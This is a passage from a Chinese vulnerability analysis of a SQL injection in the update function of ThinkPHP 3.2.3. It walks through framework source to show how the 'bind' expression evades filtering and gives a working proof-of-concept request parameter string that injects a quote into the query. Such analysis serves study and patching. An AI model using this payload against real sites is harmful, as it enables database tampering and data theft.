<span class="w">                </span><span class="p">}</span><span class="nx">elseif</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/^</span><span class="p">(</span><span class="nx">notin</span><span class="o">|</span><span class="k">not</span><span class="w"> </span><span class="k">in</span><span class="o">|</span><span class="k">in</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">exp</span><span class="p">)){</span><span class="w"> </span><span class="c1">// IN 运算</span>
<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">exp</span><span class="err">&#39;</span><span class="o">==</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">                    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                        </span><span class="k">if</span><span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                             </span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w">  </span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">zone</span><span class="w">      </span><span class="p">=</span><span class="w">   </span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">zone</span><span class="p">.</span><span class="sc">&#39;)&#39;</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span><span class="nx">elseif</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/^</span><span class="p">(</span><span class="nx">notbetween</span><span class="o">|</span><span class="k">not</span><span class="w"> </span><span class="nx">between</span><span class="o">|</span><span class="nx">between</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">exp</span><span class="p">)){</span><span class="w"> </span><span class="c1">// BETWEEN运算</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">is_string</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">])?</span><span class="w"> </span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w">  </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">exp</span><span class="p">[</span><span class="err">$</span><span class="nx">exp</span><span class="p">].</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">AND</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                    </span><span class="nx">E</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">_EXPRESS_ERROR_</span><span class="err">&#39;</span><span class="p">).</span><span class="sc">&#39;:&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="nx">count</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">count</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">);</span>
<span class="w">                </span><span class="err">$</span><span class="nx">rule</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="nx">isset</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">count</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">?</span><span class="w"> </span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">count</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">?</span><span class="w"> </span><span class="nx">strtoupper</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">count</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">strtoupper</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">count</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="err">$</span><span class="nx">rule</span><span class="p">,</span><span class="nx">array</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">AND</span><span class="sc">&#39;,&#39;</span><span class="nx">OR</span><span class="sc">&#39;,&#39;</span><span class="nx">XOR</span><span class="err">&#39;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">count</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">count</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">rule</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">AND</span><span class="err">&#39;</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">for</span><span class="p">(</span><span class="err">$</span><span class="nx">i</span><span class="p">=</span><span class="mi">0</span><span class="p">;</span><span class="err">$</span><span class="nx">i</span><span class="p">&lt;</span><span class="err">$</span><span class="nx">count</span><span class="p">;</span><span class="err">$</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="err">$</span><span class="nx">data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">i</span><span class="p">])?</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]:</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">i</span><span class="p">];</span>
<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">exp</span><span class="err">&#39;</span><span class="o">==</span><span class="nx">strtolower</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">data</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">rule</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                        </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseWhereItem</span><span class="p">(</span><span class="err">$</span><span class="nx">key</span><span class="p">,</span><span class="err">$</span><span class="nx">val</span><span class="p">[</span><span class="err">$</span><span class="nx">i</span><span class="p">]).</span><span class="sc">&#39; &#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">rule</span><span class="p">.</span><span class="sc">&#39; &#39;</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="err">$</span><span class="nx">whereStr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">).</span><span class="err">&#39;</span><span class="w"> </span><span class="p">)</span><span class="err">&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">//对字符串类型字段采用模糊匹配</span>
<span class="w">            </span><span class="err">$</span><span class="nx">likeFields</span><span class="w">   </span><span class="p">=</span><span class="w">   </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">db_like_fields</span><span class="err">&#39;</span><span class="p">];</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="nx">likeFields</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">preg_match</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/^</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">likeFields</span><span class="p">.</span><span class="err">&#39;</span><span class="p">)</span><span class="err">$</span><span class="o">/</span><span class="nx">i</span><span class="err">&#39;</span><span class="p">,</span><span class="err">$</span><span class="nx">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="err">&#39;</span><span class="w"> </span><span class="nx">LIKE</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="sc">&#39;%&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">val</span><span class="p">.</span><span class="sc">&#39;%&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">$</span><span class="nx">whereStr</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">key</span><span class="p">.</span><span class="err">&#39;</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="p">.</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">parseValue</span><span class="p">(</span><span class="err">$</span><span class="nx">val</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="err">$</span><span class="nx">whereStr</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter：</p>
<div class="codehilite"><pre><span></span><code><span class="k">elseif</span><span class="ss">(</span><span class="s1">&#39;bind&#39;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">$e</span><span class="nv">xp</span><span class="w"> </span><span class="ss">)</span>{<span class="w"> </span><span class="o">//</span><span class="w"> </span>使用表达式
<span class="w">                    </span>$<span class="nv">whereStr</span><span class="w"> </span>.<span class="o">=</span><span class="w"> </span>$<span class="nv">key</span>.<span class="s1">&#39; = :&#39;</span>.$<span class="nv">val</span>[<span class="mi">1</span>]<span class="c1">;</span>
<span class="w">                </span>}<span class="k">elseif</span><span class="ss">(</span><span class="s1">&#39;exp&#39;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">$e</span><span class="nv">xp</span><span class="w"> </span><span class="ss">)</span>{<span class="w"> </span><span class="o">//</span><span class="w"> </span>使用表达式
<span class="w">                    </span>$<span class="nv">whereStr</span><span class="w"> </span>.<span class="o">=</span><span class="w"> </span>$<span class="nv">key</span>.<span class="s1">&#39; &#39;</span>.$<span class="nv">val</span>[<span class="mi">1</span>]<span class="c1">;</span>
</code></pre></div>

<p>这里由于拼接了$val参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。
Thinkphp/Library/Think/Db/Driver.class.php</p>
<div class="codehilite"><pre><span></span><code><span class="o">/**</span>
<span class="w">     </span><span class="o">*</span><span class="w"> </span>更新记录
<span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">access</span><span class="w"> </span><span class="n">public</span>
<span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">mixed</span><span class="w"> </span><span class="no">$</span><span class="n">data</span><span class="w"> </span>数据
<span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">array</span><span class="w"> </span><span class="no">$</span><span class="n">options</span><span class="w"> </span>表达式
<span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="k">return</span><span class="w"> </span><span class="n">false</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">integer</span>
<span class="w">     </span><span class="o">*/</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">update</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">,</span><span class="no">$</span><span class="n">options</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="w">  </span><span class="p">=</span><span class="w">   </span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;model&#39;</span><span class="p">];</span>
<span class="w">        </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseBind</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;bind&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;bind&#39;</span><span class="p">]:</span><span class="n">array</span><span class="p">());</span>
<span class="w">        </span><span class="no">$</span><span class="n">table</span><span class="w">  </span><span class="p">=</span><span class="w">   </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseTable</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;table&#39;</span><span class="p">]);</span>
<span class="w">        </span><span class="no">$</span><span class="n">sql</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="s">&#39;UPDATE &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="no">$</span><span class="n">table</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseSet</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">strpos</span><span class="p">(</span><span class="no">$</span><span class="n">table</span><span class="p">,</span><span class="s">&#39;,&#39;</span><span class="p">)){</span><span class="c1">// 多表更新支持JOIN操作</span>
<span class="w">            </span><span class="no">$</span><span class="n">sql</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseJoin</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;join&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;join&#39;</span><span class="p">]:</span><span class="s">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="no">$</span><span class="n">sql</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseWhere</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;where&#39;</span><span class="p">]:</span><span class="s">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span>!<span class="n">strpos</span><span class="p">(</span><span class="no">$</span><span class="n">table</span><span class="p">,</span><span class="s">&#39;,&#39;</span><span class="p">)){</span>
<span class="w">            </span><span class="c1">//  单表更新支持order和lmit</span>
<span class="w">            </span><span class="no">$</span><span class="n">sql</span><span class="w">   </span><span class="p">.=</span><span class="w">  </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseOrder</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;order&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;order&#39;</span><span class="p">]:</span><span class="s">&#39;&#39;</span><span class="p">)</span>
<span class="w">                </span><span class="p">.</span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseLimit</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;limit&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;limit&#39;</span><span class="p">]:</span><span class="s">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="no">$</span><span class="n">sql</span><span class="w"> </span><span class="p">.=</span><span class="w">   </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parseComment</span><span class="p">(</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;comment&#39;</span><span class="p">])</span>?<span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;comment&#39;</span><span class="p">]:</span><span class="s">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">(</span><span class="no">$</span><span class="n">sql</span><span class="p">,</span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;fetch_sql&#39;</span><span class="p">])</span><span class="w"> </span>?<span class="w"> </span><span class="n">true</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">false</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>跟进execute函数：</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">execute</span><span class="p">(</span><span class="err">$</span><span class="n">str</span><span class="p">,</span><span class="err">$</span><span class="n">fetchSql</span><span class="o">=</span><span class="kr">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">initConnect</span><span class="p">(</span><span class="kr">true</span><span class="p">);</span>
<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_linkID</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="kr">false</span><span class="p">;</span>
<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">str</span><span class="p">;</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">)){</span>
<span class="w">            </span><span class="err">$</span><span class="n">that</span><span class="w">   </span><span class="o">=</span><span class="w">   </span><span class="err">$</span><span class="n">this</span><span class="p">;</span>
<span class="w">            </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">strtr</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="p">,</span><span class="n">array_map</span><span class="p">(</span><span class="kr">function</span><span class="p">(</span><span class="err">$</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="n">use</span><span class="p">(</span><span class="err">$</span><span class="n">that</span><span class="p">){</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="s">&#39;&#39;&#39;.$that-&gt;escapeString($val).&#39;&#39;&#39;</span><span class="p">;</span><span class="w"> </span><span class="p">},</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">fetchSql</span><span class="p">){</span>
<span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
</code></pre></div>

<p>这里有处对$this-&gt;queryStr进行字符替换的操作：</p>
<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="w"> </span><span class="o">=</span><span class="w">   </span><span class="n">strtr</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">queryStr</span><span class="p">,</span><span class="n">array_map</span><span class="p">(</span><span class="kr">function</span><span class="p">(</span><span class="err">$</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="n">use</span><span class="p">(</span><span class="err">$</span><span class="n">that</span><span class="p">){</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="s">&#39;&#39;&#39;.$that-&gt;escapeString($val).&#39;&#39;&#39;</span><span class="p">;</span><span class="w"> </span><span class="p">},</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">));</span>
</code></pre></div>

<p>具体是什么，我这里写了一个实例：</p>
<p>常规的跟新数据库用户信息的操作：</p>
<p>Application/Home/Controller/UserController.class.php</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">HomeController</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">ThinkController</span><span class="p">;</span>

<span class="k">class</span><span class="w"> </span><span class="n">UserController</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Controller</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">index</span><span class="p">(){</span>

<span class="w">        </span><span class="o">$</span><span class="n">User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">M</span><span class="p">(</span><span class="s2">&quot;member&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="o">$</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">I</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;money&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">I</span><span class="p">(</span><span class="s1">&#39;money&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">I</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="o">$</span><span class="n">valu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">User</span><span class="o">-&gt;</span><span class="n">where</span><span class="p">(</span><span class="o">$</span><span class="n">user</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">save</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
<span class="w">        </span><span class="n">var_dump</span><span class="p">(</span><span class="o">$</span><span class="n">valu</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>根据进来的id更新用户的名字和钱，构造一个简单一个poc</p>
<p>id[]=bind&amp;id[]=1'&amp;money[]=1123&amp;user=liao
当走到execute函数时sql语句为：</p>
<div class="codehilite"><pre><span></span><code><span class="k">UPDATE</span><span class="w"> </span><span class="n n-Quoted">`member`</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n n-Quoted">`user`</span><span class="o">=:</span><span class="mi">0</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n n-Quoted">`id`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">:</span><span class="mi">1</span><span class="s1">&#39;</span>
</code></pre></div>

<p>然后$that = $this</p>
<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.jpg" /></p>
<p>然后下面的替换操作是将":0"替换为外部传进来的字符串，这里就可控了。</p>
<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.jpg" /></p>
<p>替换后：</p>
<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.jpg" /></p>
<p>明显发现之前的<code>user</code>参数为:0然后被替换为了liao，这样就把:替换掉了。
后面的:1明显是替换不掉的：</p>
<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.jpg" /></p>
<p>那么我们将id[1]数组的参数变为0呢？</p>
<div class="codehilite"><pre><span></span><code>id[]=bind&amp;id[]=0%27&amp;money[]=1123&amp;user=liao
</code></pre></div>

<p><img alt="" src="../resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.jpg" /></p>
<p>果然造成了注入：</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
